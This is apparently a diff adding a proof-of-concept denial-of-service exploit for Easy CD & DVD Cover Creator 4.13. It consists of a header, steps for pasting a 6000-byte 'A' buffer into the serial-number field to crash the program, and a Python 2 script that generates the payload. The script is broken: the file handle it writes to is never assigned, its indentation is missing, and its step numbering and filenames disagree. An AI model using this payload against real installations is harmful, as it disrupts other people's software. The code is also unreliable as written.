@@ -1,0 +1,25 @@
+# Exploit Title: Easy CD & DVD Cover Creator 4.13 - Denial of Service (PoC)
+# Date: 22.12.2020
+# Software Link:  http://www.tucows.com/download/windows/files/ezcdsetup.exe
+# Exploit Author: Achilles
+# Tested Version: 4.13
+# Tested on: Windows 7 x64 Sp1
+
+# 1.- Run python code :Creator.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open Easy CD & DVD Cover Creator.exe
+# 4.- Press Unlock Now
+# 4.- Paste the content of EVIL.txt into the Field: 'Serial Number'
+# 5.- Press 'Continue'and you will see a crash.
+
+#!/usr/bin/env python
+buffer = "\x41" * 6000
+
+try:
+open("Evil.txt","w")
+print "[+] Creating %s bytes evil payload.." %len(buffer)
+f.write(buffer)
+f.close()
+print "[+] File created!"
+except:
+print "File cannot be created"
